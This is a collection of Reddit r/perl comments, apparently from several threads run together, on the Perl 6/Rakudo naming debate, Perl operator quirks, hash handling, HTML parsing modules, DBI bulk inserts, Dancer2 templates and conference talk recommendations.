Slides at http://jnthn.net/papers/2017-perl6-concurrency-pcp.pdf
I've had the same issue in Sweden, the second biggest city only has one (!) book on Perl in all the libraries combined which is sad.
I guess those who don't read expect to be able to grep/google all the answers they need, composing their own insights from what they find. Past \__END__ there is only &lt;DATA&gt;.
Well, I think the problem has to do more with what's in a programming language book.. 20 years ago, a book that is partly a tutorial, and the rest is a language/stdlib reference was a really useful thing. These days, why would I spend *minutes* looking for function in the book, when I can just google it. And why would I spend money on a book when there are free tutorials on the web. IMHO that's the reason many programming books are no longer really relevant. (I did enjoy reading Higher Order Perl, which is neither a tutorial nor a reference, but.. then again, if it was a series of blog posts, even better, so..)
Am I pre- or post-literate? &gt;:3
Talked on IRC channel and currently there ain't a way.
With my most recent update to the [P6 US-ASCII](https://github.com/ronaldxs/Perl6-US-ASCII/) module: perl6 -e 'use US-ASCII :UC; .say if /&lt;DIGIT&gt;/ for (^65535).map(*.chr)' | wc -l 10
No.
I had an HTML-parsing thing I had to do yesterday, so I was excited to try Mojo::DOM58. It's interesting, and impressive. Strangely enough, though, since I already know how to use `HTML::TokeParser::Simple`, I ended up switching to that, just to eliminate the learning curve. You never know what's going to be most useful. Maybe it was the relative simplicity of this project, and DOM58 will come in handy when I have something more complex. Anyway, thanks for the recommendation, and I'll look at it again sometime. In the meantime, I still like `HTML::TokeParser::Simple` quite a bit :) 
:encoding is generally considered a hog, and hence may not be the best thing to benchmark against. :utf8_strict is much faster and likely to become :utf8 in 5.28
I don't see how Rakudo has benefitted from the name Perl 6. They are not the same language. Rakudo may take plenty of ideas from Perl 5, but it also takes from numerous other languages. The things that make Rakudo interesting are things that it does differently from Perl 5. The only thing really tying it to Perl is sharing a handful of community members. But that also isn't an exclusive thing. People in the Perl 5 and Rakudo communities are members of plenty of other technology communities. Perl 5 isn't popular enough or have enough good PR at this point for it to have a positive effect on Rakudo. Using Perl in its name has only carried along baggage from Perl 5's mistakes. And at the same time, it has limited Perl 5's ability to move past those mistakes or choose its own fate. Both communities would be better off if the languages were divorced from each other.
"Rakudo is the King of Unicode and Queen of Concurrency" - I like it!
Perhaps this could be fixed by creating a new `BoolJSON` subtype, which does all the checking the current `Bool` does, but also allows the JSON types.
Completely agreed with everything in this article. Props for taking the first step.
It might be worth revisiting a new bug report with the current maintainers of Moose.
Food for thought regarding "It's too late to do $x / it's too much effort to do $x" -- this is the same reason Stu Feldman gave for not changing from tabs in Makefiles, and it's the same reason for not fixing some of the architectural problems in Perl in 2000. It's a lot of work to change things today, but it'll be even more work to change them tomorrow.
I think the concern is that adding support for overloading might break existing code that expects this to work the way it has for ages. FWIW, [Specio](https://metacpan.org/release/Specio) handles overloading by default for its built-in types (Str, Bool, etc.). It's more or less a drop-in replacement for Moose types (though the syntax is slightly different).
**TL;DR** What about encouraging everyone to call the language `P6`? We could aim to break the back of the task of making this shift cosmetically within 100 days. (And, perhaps, plan to complete this shift by, say, 2019, in time for a major "P6" marketing push around the time of `6.e` / 2020.) I've been mulling Perl's branding issues (privately, but largely holding my tongue publicly) for over two decades. I've had a brief but illuminating private exchange with Larry about this stuff about 5 years ago. (I agreed with what he had to say.) This post seems like the right time to speak up. In this comment I suggest an **ultra simple foundation** for a full frontal assault on all the issues I'm aware of surrounding *three* entities / brands, namely "Perl", "Perl 5", and "Perl 6". (To simplify things for now I'll "ignore" variations like the lowercase "perl", "perl5", "p5", "perl6", and "p6". In truth, I've been mulling those for years too. I have the sort of brain that insists on taking everything into account.) First, I'll address zoffix's suggestion. Then some thoughts about Perl brands. Finally, my suggestion. # Zoffix's suggestion I'm open minded about deliberately mentioning the language ("Perl 6") less, and mentioning the de facto reference compiler ("Rakudo") more. I can see such a switch in emphasis bringing significant benefits if it's deployed correctly. That said, I don't think such a switch in emphasis, on its own, would achieve the change I think is really needed. Additionally, afaik, the language lead and the compiler lead both reject the notion of conflating the language with the compiler. If either they or I am right, then we may end up just getting a short term boost at most *if we're lucky*, and perhaps just more internal conflict, and external confusion, noise, ridicule, lack of attention, and additional long term marketing debt if we're not. In this comment I've given zoffix's suggestion short shrift. I've focused on just a tiny part of it. I've ignored a lot of substance in their suggestion. But please know that I definitely don't want this comment to come across as stop energy or telling folk what to do or not to do. Before I move on, please know that I think my suggestion is best viewed as complementary to zoffix's, not in opposition to it. # My thoughts about Perl brands I think zoffix's position is more or less that he no longer cares about the Perl and Perl 5 brands and wishes the Perl 6 brand was called something else. I think that's a reasonable stance but mine is different. I care about the zoffix's of this world, and all the newbies who likely also won't care about Perl but I also care about Perl, Perl 5, and making reasonable sense of their connections with P6. * **Perl.** Imo, whether "Perl" drifts toward increasingly positive or negative associations among the general population, and whether we like it or not, these brands are here to stay for decades. 30 years of internet references and comic strips use the term "Perl" and they're not going to go away. In general, for better or worse, Perl is our family name. It's really the same problem "anarchism" has. * **Perl 5.** Most usage of "Perl" means "Perl 5" and vice-versa.. I think we need a solution that could maintain that equivalence-by-default for decades. Imo, if at any point a rebranding of "Perl 5" would help, "P5" is an obvious candidate with no obvious downsides and my instinct is that it would work nicely if deployed a few years down the line assuming P6 has become a sufficiently well loved brand. In the meantime, one oft heard refrain from P5ers is that they'd like folk to stop talking about Perl 6 because it's damaging their brand. * **Perl 6.** Imo this brand nowadays combines almost all the negatives associated with "Perl" and "Perl 5", with almost none of their positives, plus a bunch of its own negatives on top (duke nukem effect, prematurely "released", performance issues, etc.). Even *Perl* folk hate on Perl 6. Almost any attempt to talk about Perl 6 ends up mired in these branding problems. # My suggestion We encourage everyone to call the "Perl 6" language `P6`. Suitably managed, I think a switch to `P6` would be sufficiently disruptive to disarm folks' fixed associations with the term "Perl". More importantly, I think it's much *less* disruptive than a switch to using "Rakudo". I think it is likely to be much more harmonious with history and with were "we" are as we approach `6.d` (no matter how you define "we"). If a troll points out that "Perl 6" and "P6" are the same, or that we're just trying to avoid the brand "Perl", we let them, because it's true. Perhaps we point folk to a FAQ that explains we made the shift to P6 because trolling that was incorrectly conflating Perl 5 with Perl 6 was overshadowing the fact that they're different languages, leaving P5ers to deal with trolling about P6 and vice-versa. Given what I know of the P6 community, I think it would be reasonable to aim to: * Break the back of the task of making a shift to P6 cosmetically within 100 days; * Complete this shift by, say, 2019. (I'm fantasizing about a major Perl marketing push around the time of `6.e` / 2020. No, I don't consider using the word "Perl" there a contradiction.) I'm not arguing for deprecating "Perl 6". At most I'm suggesting its depreciation -- an "official" announcement or somesuch that makes clear that "Perl 6" is considered valuable, but less valuable than "P6". But we might not even bother with that. Implementing this suggestion could consist of nothing more than some folk doing some rounds of `s/Perl 6/P6/` in our current documentation and in tweets etc. Finally, my suggestion is potentially complementary to zoffix's suggestion. To be honest I haven't yet read the whole of the OP and I have to run and am posting this when it's still in draft form. But I don't want to leave posting this till tomorrow. I hope zoffix doesn't feel I've hijacked this thread. Peace and love to all, raiph
I like this suggestion as well. On top of that, these ideas are even combinable. Rakudo P6, called either Rakudo or P6 for short, and it's still not really a change in the names everyone has been using already.
&gt; What about encouraging everyone to call the language P6? Not sold on that, since it's not a name, but an empty abbreviation. It does successfully avoid the 'Perl' name, but it does only that. My goal is to have a usable, easy to remember name as well. The troll avoidance is a bonus, not a primary goal. &gt; zoffix's position is more or less that he no longer cares about the Perl and Perl 5 brands and wishes the Perl 6 brand was called something else More accurately, I don't think Rakudo language has any of the attributes of a Perl brand. Calling it 'Perl 6' is like calling a can of cream cheese "Milk 6". It might be top notch cream cheese, but people looking for cream cheese won't find it and you can prefix its mention with explanations that it's just a name and it's really cream cheese and not milk, but you'll find a lot of people being disappointed they bought milk and ended up with cream cheese. The primary goal is not to avoid 'Perl' because it's "bad", but to have a unique name to be able to tell about all the reasons why our cream cheese is great. &gt; That said, I don't think such a switch in emphasis, on its own, would achieve the change I think is really needed. No, it won't. The goal of the change is to open clear branding and marketing opportunities. It's those that will bring the change. On Christmas 2015, I gave the benefit of the doubt that the reasoning for rejecting name change was sound. Today, I bring forward the argument that that reasoning did not hold up to expectations and we need to correct our course. The pumpking and BDFL have the ability to create a much better name than "Rakudo Perl 6" and I hope they do and not merely ignore this discussion. We have a great product. It's greatness is hidden by poor branding. Let's fix that.
&gt; Not sold on that, since it's not a name, but an empty abbreviation. Not that I think it's better or worse, but I don't think this is entirely a bad prospect. It's not like "Perl" has any real meaning itself. Also, even "P6" is infinitely easier to get google to index in a proper context than, say, [go](https://stackoverflow.com/questions/3758434/searching-for-information-about-the-go-language).
'Perl' is fairly clear as being a name, whereas 'P6' is an arbitrary combination of a letter and a number. It's not very memorable (was it "Z6"? "P9"?) nor does it clearly indicate a name and not [some technical term](https://en.wikipedia.org/wiki/P6_%28microarchitecture%29), so phrase "Concurrency in P6" needs extra processing to figure out the meaning. 
my guess is m/foo/ compares $_=~m/foo/ and returns 0. then it's $_ ~ 0; # bitwise NOT then it adds the result (0) to $str Is this correct? 
That's ... not actually a regex at all. You create "this is foo string", then you try and add tilde-space-m-slash-foo-slash to it, which doesn't work. Plus is for numbers. Not sure why it's returning true. But anyway: use strict; use diagnostics; use warnings; and things won't "work". You'll get useful messages. I'm assuming `+~` was just a typo originally.
Pretty much, except: * ~~`m/foo/` returns undef, not 0, if there was no match. But the undef is coerced to 0 when used arithmetically, so it works out the same here.~~ (**Edit**: this is incorrect, see /u/aanzeijar's response below) * `~` is a unary operator, not binary. * `~undef` = `~0` is 2**64 - 1 on most systems, and in any event is not zero. If it had been zero, nothing would have been printed, because adding it to the non-numeric string would have given zero. `use warnings;` / `perl -w` would have confirmed some of that: * Use of uninitialized value $_ in pattern match (m//) * Argument "this is foo string" isn't numeric in addition (+)
humm very interesting. I'll have to read up a bit further. Thanks!!
yep! it was a typo. I usually use warnings, however, i missed them on this occasion. 
I have added more discoverability. I would also appreciate any contribution.
Deparse is very helpful in situations like this: [18:21] c:\Users\xenu&gt; perl -MO=Deparse,-p -e 'my $str="this is foo string"; if ( $str +~ m/foo/ ) {print "true\n"; }' (my $str = 'this is foo string'); if (($str + (~/foo/))) { print("true\n"); }
Also -- seems like the problem is using a version number as the name. (I know, the *intent* isn't to use "6" as a version number, but ten years of attempting to explain that hasn't worked.)
I code in C++, Python, Perl, and (if I must) Java. The "computers" section of bookstores has been dead to me for *years*. I have watched the computers section of bookstores shrink to &lt; 10 shelves in recent years. There are also other interesting and useful languages that are rarely if ever represented on the &lt; 10 shelves. Haskell, R, Scala... The best source of information for all the good languages is not a bricks-and-mortar bookshop. The Internet is my library for computer science. It is a *far better* resource than a bookshop. And I would suffer far more without Internet access far more than I would without the typical computer section of a bookshop. There are some truly great computer books. If I want a paper reference, there is Amazon and Abebooks. Great programming books are rarely if ever stocked by bricks-and-mortar shops. Any person with strong interest can find all the necessary information on the Internet. In fact, learning to find this information and use the IPv4/IPv6 infrastructure is a mandatory part of the growth and maturation of a programmer. Bookstores stock their &lt; 10 shelves in the computers section with what they guess they can *sell*. What do their likely non-programming personnel guess they can sell these days? Dummies books, How to use a Mac, How to use Adobe products, maybe a box of study tools for a bureaucratic certification, and various attempts to help beginners C++, Java, Javascript, and Python. I wonder what their profits from these &lt; 10 shelves are. 
That looks interesting! Thanks. 
It's almost like the general programming population have their own ideas on how version numbers work and no amount of persuasion from the Perl community is going to change their mind.
Maybe the "hundred year" part of "hundred year language" describes how long it'll take to give up on that strategy.
Yesss, I was needing a Ctrl+c handler for perl at work last Friday. Not the point of the article, but glad I read it anyway.
But it is so obvious that it's different, I just can't imagine anybody confusing it with perl 4 or perl 5
It's called Perl 6. Why would one not assume that it's just the next version of Perl, when it's _literally_ named as the next version of Perl would be? This being a completely new language from the ground up, with a different vision and different goals, the reasons to call it something different are obvious.
I did the same assumption. Then I looked at it to see what changed and was heavily impressed. The same is true for php5 / php7, though they did more minor changes. The language is new, yes, but it shares the same history and same language designer, so why not the same name.
&gt; ...why not the same name. Because the name is poison. I love Perl and have loved it for 20 years. But in the industry, it has fallen out of favor, in terms of the workforce possessing the skill, vendors providing APIs for it as a first-tier language (because it's not anymore), etc. The only way to get the mainstream development community using Perl again (if that is even a desire) is to call it something else.
I see your point. But no matter what the industry does, Perl and Lisp are the two language families that will never leave the hacker scene. Perl 6 had to choose what is more important: the few very talented perl hackers out there or the industry. I think they made the right decision.
Those decisions are not only in the marketing but also in the language. They tried hard to become an acceptable lisp and by doing so became an awesome Perl. Things like meta programming are not interesting for most industries. For them, Perl6 gives too much freedom to be helpful for organizing big projects.
I also see your point. I guess I'm not sure which category I fall into, because they've missed me. I haven't touched Perl 6 and have no desire to. Because I've been using Perl 5 as my bread and butter for 20 years, and I don't (yet) perceive a need to jump into Perl 6 (in the same way that I don't perceive a need to get super-seriously into Node or Python. Maybe I'm "the industry" and maybe I'm a "talented perl hacker," as you say. I suspect I'm a little bit of both.
Clicking on distribution names doesn't seem to work yet. I think the service is okay, but my advice would be to expand to include node, Ruby, and Python. There are probably too few potential paying customers if you limit to CPAN only.
On a rather related note, is the most compact syntax for swapping two hash values in Perl 5 like below or is there another way? for (\%hash) { ($_-&gt;{foo},$_-&gt;{bar}) = @{$_}{qw/bar foo/} } Although for short hash name, one might as well use the actual name.
So watch recommendation for the lightning talks is: all of them. Any more specific recommendations? :) 
a professional Perl Hacker. that description would fit
Can you give me more information on this issue? It should be working. Yes, npm is the next one.
You can use the hash slice syntax on LHS too: @$_{qw/foo bar/} = @$_{qw/bar foo/} Loop isn't needed (note the change of sigil to `@`): @hash{qw/foo bar/} = @hash{qw/bar foo/}
When I hover to a distribution name, it just shows the "no entry" pointer.
Ah, on the main page? It's a just screenshot. There are no publicly visible projects right now. They are all private.
&gt; why not the same name Because it's not the next version of Perl. The Perl community can spend the next 17 years trying to convince the rest of the world that something universally understood as a version number isn't actually a version number, but it's not going to work any better than it has for the past 17 years.
It is a new version. Though it is common to maintain previous versions, as well as doing major changes when toggling the first version digit, so there is nothing wrong here either.
&gt; It is a new version. Not according to the marketing message since at least 2010 (and possibly 2007, if you believe some of the retcons). The current explanation is something like "sister languages in the same family". See explicitly "[Perl 6 is not intended to replace Perl 5](https://docs.perl6.org/language/faq#Why_is_Perl_6_called_Perl?)" in the P6 FAQ.
So perl 6 is the next language in the family. Makes sense to increment the number by one to me. But really, I don't care how it's called. They could have called it Python 4 and I would've used it, because it is a good language. Naming does matter hardly at all, when the technical things are right.
To my mind, Mojo::UserAgent is a lower-level tool than WWW::Mechanize, so it's not surprising it doesn't offer all the convenience a crawler would. It's really a better-designed LWP::UserAgent than a replacement for WWW::Mechanize. Why are you replacing WWW::Mechanize at all, out of curiousity?
Take a read through http://www.cpan.org/modules/04pause.html#takeover . General procedure is if you attempted to contact through direct email and in the issue tracker and got no response in a couple weeks, send a copy of the mails to modules@perl.org (if they weren't already CC'd) and they can help you with an adoption if the maintainer appears to be unresponsive. EDIT: Also, these are the current permissions of the distribution, it appears to have some comaintainers, but they don't seem to have been involved in the module for a while so they may not be much help either. https://metacpan.org/permission/distribution/Net-Server
&gt; So perl 6 is the next language in the family. Makes sense to increment the number by one to me. No other language, to my knowledge, treats version numbers this way. &gt; Naming does matter hardly at all, when the technical things are right. This reads like the "the best technical product will certainly succeed in the marketplace" fallacy.
Well, I recently discovered `Mojo::DOM`, and that I could use it to replace my clunky use of `HTML::Parser`, and I thought that I could go using just the `Mojo` framework for all the tasks. Even if it is not as convenient for "clicking buttons" I am still thinking of going fully "Mojo-based"; I really like this framework. Thanks for your comment, by the way!
Mojo::UserAgent is certainly usable for this task but as you noted, it only does the requests you specify; it doesn't contain the logic of WWW::Mechanize for reading the form on an existing page and submitting values to it.
&gt; Mojo::DOM Try Mechanize + Web::Query(::LibXML). WQ is the best declarative HTML parser.
We tried the language. Despite it's name. I don't get it why anyone would not try it because of its name. The language won't be very successful just because of sigils. Sadly I know many developers who can't deal with them and declaring every variable with a backlash is nothing better for them.
All the variables corresponding to widgets can be lexical in the subroutine that builds the GUI. When you need to update one widget from a different one, just pass the widget to be changed into the callback associated with the latter, i.e. some of the callbacks will be closures over widgets they need to access.
I'm trying not to manage all the logic from the GUI, but rather in a more structured way, so most of the functions aren't callbacks but are called from other places. I guess I can't avoid intermixing my GUI code with the rest, then? (i.e. an addContact function would have to take a whole bunch of widgets as parameters). Oh bummer. :( 
I have to agree with zoffix here. Please, please, please stop "naming" things with numbers in them. 
This is on the todo list for Mojolicious, and i've made a few attempts to add it already. But so far it always got blocked by obvious bugs, or lack of enthusiasm from the community. Last one was a few weeks ago. https://github.com/kraih/mojo/commit/861193d93e4d83b624a91c87987254f5aeda3a6e
The line between `Mojo::UserAgent` and `WWW::Mechanize` gets blurry with `Test::Mojo`. `Test::Mojo` could very well have a `submit_form_ok` method, even if we consider `Mojo::UserAgent` too low level.
Nice, thanks!
Nevertheless, I am realizing that, anyway, back in the day I had to inspect the forms from the HTML source code, since I had to discover that the form I was interested was the first one in the page, and that the parameters were those shown in the snippet. So it is still more convenient, but not so much as I remembered.
Ah yeah. There's even a role for `Test::Mojo` that does have such method: [`Test::Mojo::Role::SubmitForm`](https://metacpan.org/pod/Test::Mojo::Role::SubmitForm)
I also will watch this. Thanks for the reference!
TL;DR: &gt; A Deep Hosting investigation into the events that preceded the hack showed that the attacker was not able to execute the Perl shell, but the PHP version worked just fine.
when you don't bother to change the default mysql passwords, you deserve what you get
It's been done before: [model-view-controller](https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller)
I KNEW there had to be a better way. I'll read a bit on it. Do you have any specific Perl pointers on this? :)
Sorry, no. I've never done anything with Perl/Tk. There's a Mastering Perl/Tk book from O'Reilly that might be useful. Or maybe a general book on GUI design.
&gt; I don't get it why anyone would not try it because of its name. That's not my argument.
I know.
You should know what your data is and you should know your code points. Don't stop at 2**16. grep {/\d/} map {chr $_} 0..1114111 yields up to 580 digit characters depending on your perl and Unicode version.
I've just been looking at random videos (thanks to the organizers for recording and uploading everything!), but some of the ones I've really enjoyed are * [David Golden - "Real World Optimization"](https://www.youtube.com/watch?v=_PJIVVGAZqA) * [John Anderson - "Logs Are Magic: Why Git Workflows and Commit Structure Should Matter To You"](https://www.youtube.com/watch?v=n_WGiS8fm8s) * [Dave Rolsky - "A Date with Perl"](https://www.youtube.com/watch?v=enr5_FoToiA) There are so many more I've yet to watch. Woot!
I also enjoyed "Real World Optimization". The other ones I've watched so far include: * [Nova Patch - "The \X-Files"](https://www.youtube.com/watch?v=m7HJ0W5wft0) - agreeing with Frew Schmidt, less structured than the previous talks, but great speaker nonetheless * [Lightning Talk by Randal Schwartz - "Why Google's Dart should be your next programming language"](https://www.youtube.com/watch?v=cDMMF_b7Kbs) - cool talk, but not sure if i'm going to use Dart anytime soon * [Lightning Talk by R. Geoffrey Avery - "sudo From a Folder: For the Slightly Trusted User"](https://www.youtube.com/watch?v=RarVGKBar0A) - cool trick * [Bruce Gray - "Your Perl 5 Brain, on Perl 6"](https://www.youtube.com/watch?v=EUXclZ_d0DQ) - educational, and *very good* to listen in the background. I even ended up listening to Bruce's other talks. * [Brian Duggan - "Extending Perl 6 Command Line Argument Parsing using Metaprogramming"](https://www.youtube.com/watch?v=D16wa-gnFwE) - my area of interest, looking forward to do some integration between my framework and Perl 6, er, Rakudo on this. * [Sawyer X - "Pakket - An Unopinionated Meta-Packaging System"](https://www.youtube.com/watch?v=aiNRbQKX9iU) - informational * [Lightning Talk by Len Budney - "Manners for Perl Scripts"](https://www.youtube.com/watch?v=ud3isNiB_C0) - i watch CLI-related talks * [Lightning Talk by Nicolas R. - "grep::meta::cpan"](https://www.youtube.com/watch?v=f0CqeVw7nXc) - from this talk i know not to abandon grep.cpan.me yet because gcm allows regexing against filename, dist name, and author. * [Brad Lhotsky - "Writing Command Line Tools for Other People"](https://www.youtube.com/watch?v=lUGm5c4ubZA) - i watch CLI-related talks * [Stevan Little - "Hold My Beer and Watch This!"](https://www.youtube.com/watch?v=w5U7eoeuO90) - the talk i enjoyed the most, let's hope for UNIVERSAL::Object to get into core soon and for us to have interoperating object systems. * [Lightning Talk by Chad Granum - "In Response to D. Conway's Test::Expr"](https://www.youtube.com/watch?v=wGTZCaU_z5U) - looking forward to more like this! :)
Perhaps you should add a couple high-profile CPAN distributions as "publicly visible project" examples. E.g. `Catalyst`, `Mojo`, `Dancer`. 
~undef is still undef. Afaik, it only uses arithmetic complement on integers or floats. Everything else gets string complement.
Aha, you're right. What's actually happening is that the match is running in scalar context, so is returning a boolean, which gets treated as an integer by `~`.
Small nitpick (and I had to check that myself just now): The scalar response from that match is a dual var: $ perl -MDevel::Peek -le 'my $str="this is foo string"; Dump(m/foo/);' SV = PVNV(0xc13010) at 0x7b7720 REFCNT = 2147483647 FLAGS = (IOK,NOK,POK,READONLY,PROTECT,pIOK,pNOK,pPOK) IV = 0 NV = 0 PV = 0x590b81 "" CUR = 0 LEN = 0 It's flagged as valid integer, numeric, and string, has an integer/numeric value of 0 and a string value of ''. (Also: should the refcount underflow here?) So you can do weird stuff like this: $ perl -le 'my $str="this is foo string"; print "m// returns the empty string «@{[ m/foo/ ]}» with numeric value of @{[ ~~m/foo/ ]}";' m// returns the empty string «» with numeric value of 0 Because interpolation in strings prefers the string value, and complement prefers the integer value.
Thanks! I suspected this was the case (since it prints as the empty string, but `~` does numeric complement rather than string), but didn't know about `Devel::Peek` to check.
This does not belong here. Even though there is a guy called Perl in the article.
Your paste site doesn't allow adblockers. Here's some alternatives: https://gist.github.com/, https://perlbot.pl/, https://paste.debian.net/ First I'll note that you are using the outdated interface, the docs now recommend to use the module like this, no $parser object needed: my $xmldoc = XML::LibXML-&gt;load_xml(location =&gt; $filename); After that it is a matter of whether your XPath expression (the argument to findvalue) is a correct path to your elements. Without seeing the data my first thought is that it should not start with `.`.
When namespaces are invovled, use XML::LibXML::XPathContext: #! /usr/bin/perl use warnings; use strict; use feature qw{ say }; use XML::LibXML; my $xpc = 'XML::LibXML::XPathContext'-&gt;new( 'XML::LibXML'-&gt;load_xml(location =&gt; shift) ); $xpc-&gt;registerNs( imscp =&gt; 'http://www.imsglobal.org/xsd/imsccv1p2/imscp_v1p1' ); say for $xpc-&gt;findnodes('/imscp:manifest/imscp:organizations'); 
&gt; Until Log::Any 1.00 came along in late 2014, when its startup overhead jumped from ~2ms (version 0.15) to ~15ms. There is a certain breed of Perl developer that becomes so obsessed with Computer Science concepts and extensibility that they forget what Perl is very good at: *pragmatism*. Perl is *fast* when used simply. Oh, sure, Perl is *highly* extensible, too; and that most definitely has its uses. But it is extremely important to defend those who wish to use Perl in a simpler way. Because others might forget that there is *more than one way to do it*.
Thank you
Thank you
Is there a special reason to quote the package names?
See [Invoking Class Methods in perlobj](http://perldoc.perl.org/perlobj.html#Invoking-Class-Methods)
I've never had any naming conflicts that required that. TIL
Well, what I see other people do in other languages is that they remove all the text from the templates and call a function to fetch any block of text by an identifier name, so for example get_text(KEYWORD_SEARCH) would return "Keyword Search" in english and "Cherche le kle-mot" or something if you were in French mode. Then they stick all the ID to text mappings in files like ini files or YAML or whatever makes sense, and they have a file per locale, so depending on what locale you are in, that's the text you get. That's generally considered better than putting language-selection logic into your presentation layer. But I don't know of any particular perl ways to do it. look for I18N as code for Internationalization and see what libraries come up, maybe?
Thanks for the suggestions.
Show us the entire code on a pastebin somewhere.
See also [WWW](https://modules.perl6.org/repo/WWW) that has JSON decoder in it for free.
Did you tell Dancer2 to use Template Toolkit? If I recall correctly it uses a different template engine. If you look at the source of the HTML that the app generates do you see `&lt;% var1 %&gt;`?
there's a "zef IO::Socket::SSL" in there that should instead be "zef install IO::Socket::SSL"
fixed. thanks.
I figured it out (it was me not quite understanding the template function) and included it in an edit in my original post. I appreciate the help!
I figured it out (it was me not quite understanding the template function) and included it in an edit in my original post. I appreciate the help!
Glad you figured it :-) FWIW, the template keyword doesn't halt route execution because it's nor unusual to want to capture the output for other reasons - e.g. building an email from a template, etc. 
I'm happy that Perl 5 is still well-maintained.
"""maintained""" Seriously fuck Perl6 with a broomstick 
Ouch :)
I still have hopes for Perl6, though.
It's a completely different language; it should have a different name.
I like Perl 6. It's actually a wonderful language.
There's currently a push to change the name for 6.d language release. You could leave your feedback on the thread: https://www.reddit.com/r/perl/comments/6lstqu/the_hot_new_language_named_rakudo/
My vote's for larry: the language.
BTW, last statement has implicit return in perl, how is "return template ..." and just "template ..." different?
Surely just loop over the region and test against a regex? Something like: sub displaysAsBlank { my ($sheet, $start_row, $start_col, $end_row, $end_col) = @_; $end_row //= $start_row; $end_col //= $start_col; my $blank_cells = 0; foreach my $row ($start_row..$end_row) { foreach my $column ($start_col..$end_col) { $blank_cells++ if $sheet-&gt;{Cells}[$row][$column] =~ /^\s*$/; } } return $blank_cells; }
I like to be very explicit with returns so that I can avoid the issue I had. Basically, I had written some extra stuff below my template line originally for testing and was going to comment it out but missed part, and I was under the impression per a bad tutorial that "template" implied a return / halting of execution of the function in dancer2 so I didn't even think about it until I exhausted everything else. I've also been working in languages where last statement does not imply return for work so even then it slipped my mind until I really thought about it. By adding the explicit return, it won't really change how perl executes, but it will improve the readability in my opinion and prevent any future issues like that.
Looping over the region was what I was hoping to avoid. They function looks good though, hadn't thought of a regex.
When you push a hash into an array, you flatten it into a list, hence the error. You might find this sub helpful in copying the contents of the array or hash: http://search.cpan.org/~garu/Clone-0.39/Clone.pm
FWIW, in Rakudo Perl 6, hashes do *not* get flattened in an array when using `.push`. And you can create so-called object hashes, which *can* take an object as a key without stringifying. my %hash{Any}; # allow any object inheriting from Any as key
&gt; I want to store a hash in an array (not a hash reference) That is not possible. Arrays can only contain scalars. &gt; push @SublistWords, %key; This converts the hash to a list of items and appends them all to the array. The array does not contain a hash, because it can't, because a hash is not a scalar and arrays only contain scalars. #!/usr/bin/env perl use warnings; use strict; use Data::Dumper; my %foo = (x =&gt; 1, y =&gt; 2, z =&gt; 3); my @bar; push @bar, %foo; print Dumper \@bar; Output: $VAR1 = [ 'y', 2, 'z', 3, 'x', 1 ]; 
Why were you hoping to avoid it? :S
This does not appear to be a Perl 6 question. I suggest not confusing beginner Perl 5 questions with Perl 6 answers.
You kind of do need to push the hashref on there to retain the data structure. Otherwise it will be flattened into a list, like /u/Rhomboid demonstrated. This is what it should look like. my %key = ( sublist_number =&gt; $sublistnumber, member =&gt; lc($member), found_count =&gt; 0, ); my $member = $key{member}; # get a value out of the hash %key push @SublistWords, \%key; # note \ to take a reference to the hash ... some code later in a different function ... for my $sublistitem ( @SublistWords ) { # note -&gt; to dereference the hashref to get a value # out of the hashref $sublistitem my $found_count = $sublistitem-&gt;{found_count}; } 
You could also have created a hashref in the first place, like this: my $key = { sublist_number =&gt; $sublistnumber, member =&gt; lc $member, found_count =&gt; 0, }; push @SublistWords, $key; 
&gt; hashes do not get flattened in an array when using .push Which is why "Perl 6" is a completely different language from the Perl we know and love. Different syntax, different organization, different concept. Can we please not call it "Perl 6" anymore
&gt; Can we please not call it "Perl 6" anymore There's an active discussion on that very topic. I suggest you voice your feedback on the appropriate thread: https://www.reddit.com/r/perl/comments/6lstqu/the_hot_new_language_named_rakudo/
First thing I'd do is split the do into prepare/execute. my $sth = $dbh-&gt;prepare('INSERT INTO ...'); for (...) { $sth-&gt;execute(...); } Then you could try batching multiple rows into a single insert like: INSERT INTO foo VALUES (?, ?),(?,?),(?,?)... Probably wouldn't want to do 3000 at once but you could test to see what works best.
I havn't been able to get it to work yet for some reason trying to do the same thing as you but SQL::Interp makes it sound like you can do this. http://search.cpan.org/~markstos/SQL-Interp-1.24/lib/SQL/Interp.pm#Default_arrayref_of_(hashref_or_arrayref)_behavior
thanks! I guess, I should play with the numbers of records, see the speeds..
cool! do I read this correctly: this basically simplifies building the SQL command to use with DBI?
Complicated. Hold onto your seat. I am designing a system to process lots of spreadsheets. The sheets get sent from different people. When each person sends me their sheet, it needs to have the same number of columns as last time or I have to assume the information's changed. So. What does that mean, the same number of columns? Simplest way to get the extents of a spreadsheet is to open it in Excel and go Ctrl+End. That will take you to the highest row and column combo that Excel believes has a defined value. Open it in Spreadsheet::XLSX and the highest row and column is a property of the sheet. Problem is, it's not reliable. Excel may have had info out there at some point but it may not still have it (it was deleted). So, Excel says the highest column is NG, for example and highest row is 25000 say (Ctrl+End takes you to cell NG25000). But last time the sheet was only P columns wide. Which is it really? NG or P? If it's P but someone has fiddled with the sheet at some point and Excel now THINKS it's NG, that's fine. If it's actually NG (or any letter higher than P) then I need to not process the file. So, I can go to cell NG25000 and test for a value. If it's got one, then great, the sheet is NG wide and I can stop testing. If it has no value, then go to NG24999 and test for a value. Then carry on iterating down to NG1. If still no value, then go to NF25000 and test. So, that's 9,600,000 cells to test. If that's what I have to do, so be it. I'm trying to work out if there's a more efficient test pattern I can run.
I haven't tested it, but I'd think that writing out an sql file and then using mysql to load it via command might have some speed to it. That's not always a possibility depending on the security settings in the mysql realm though.
The ops question is valid Perl 6 syntax, apart from the last line. my %foo = (x =&gt; 1, y =&gt; 2, z =&gt; 3); my @bar; push @bar, %foo; dd @bar; # Rakudo Perl 6's built-in tiny Data Dumper ============== Array @bar = [{:x(1), :y(2), :z(3)},] As to different syntax/organization/concept, I'd like to see it as *improved* syntax/organization/concept! Please let's not forget that Rakudo Perl 6 is a culmination of the ideas expressed in the RFC's ( https://perl6.org/archive/rfc/). As to 'Can we please not call it "Perl 6" anymore', personally I have started to refer to "Rakudo Perl 6" whenever we're talking about the currently most active implementation of Perl 6. And I would suggest that people more involved with the development of Perl 5, would follow Matt Trout's proposal for 'Pumpkin Perl 5' (http://shadow.cat/blog/matt-s-trout/names-and-numbers/ ). 
This is a good answer. And you can probably even do 3000 rows in one query, dealing with many placeholders isn't one of the things MySQL is bad at.
Yes. But like i said i think im doing it wrong and not yet getting it right. 
